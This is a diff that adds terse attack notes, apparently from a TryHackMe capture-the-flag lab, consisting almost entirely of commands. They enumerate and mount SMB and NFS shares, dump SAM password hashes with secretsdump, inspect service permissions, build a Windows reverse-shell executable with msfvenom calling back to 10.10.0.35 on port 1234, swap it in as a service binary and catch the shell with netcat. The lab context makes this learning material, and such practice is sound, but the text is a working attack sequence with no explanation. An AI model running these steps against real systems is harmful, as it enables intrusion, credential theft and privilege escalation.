@@ -1,0 +1,25 @@
+smbclient.py SAM/ghj@172.31.1.18
+shares
+sudo mount -t cifs -o username=ismail //172.31.1.18/backups /mnt/ 
+sudo mount -t cifs user=,password= //172.31.1.18/backups /mnt/ 
+mount -t cifs -o user=myuser,vers=1.0 //myserver/myshare /home/user/myserver/myshare/
+
+secretsdump.py -sam SAM -system SYSTEM LOCAL
+
+icacls services/monitor1.exe
+cmd /c 'sc sdshow monitor1'
+
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.0.35 LPORT=1234 -f exe > monitor1.exe
+
+upload monitor1.exe
+
+nc -nlvp 1234
+
+cmd /c "sc start monitor1"
+
+
+#Port 2049
+showmount -e 10.10.187.116
+
+sudo mount -t nfs 10.10.187.116:/users /home/kali/Try-Hackme/RazorBlack/users -o nolock
+
